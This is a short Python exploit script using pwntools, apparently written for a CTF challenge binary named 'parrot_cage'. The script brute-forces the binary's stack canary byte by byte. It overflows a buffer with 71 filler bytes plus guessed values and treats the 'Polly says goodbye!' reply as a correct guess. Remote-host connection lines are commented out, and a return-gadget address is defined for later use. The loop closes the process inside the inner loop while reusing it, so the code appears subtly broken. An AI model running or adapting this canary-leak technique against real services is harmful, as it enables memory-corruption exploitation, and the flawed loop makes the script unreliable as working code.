#!/usr/bin/env python3
from pwn import *
import time

#HOST, PORT = "offsec.m0lecon.it", 13560
OFFSET_TO_CANARY = 71
elf = ELF('./parrot_cage', checksec=False)

ret = 0x000000000040101a

#p = remote("offsec.m0lecon.it", 13560)
#gdb.attach(p, gdbscript="""
#set follow-fork-mode child
#set detach-on-fork off
#b read_query
#c
#""")
known = b"\x00"
for i in range(7):

    io = process(elf.path)
    for bval in range(256):
        guess = known + bytes([bval])
        payload = b"A" * OFFSET_TO_CANARY + guess
        #io = remote(HOST, PORT, level='error')
        #io.recvuntil(b"location: ")
        io.send(payload + b"\nbye\n")
        try:
            data = io.recv(timeout=0.5)
        except EOFError:
            data = b""
        io.close()

        if b"Polly says goodbye!" in data:
            known = guess
            log.success(f"byte {i+1}: {bval:02x}")
            break

canary = u64(known)
log.info(f"Canary: {canary:#x}")

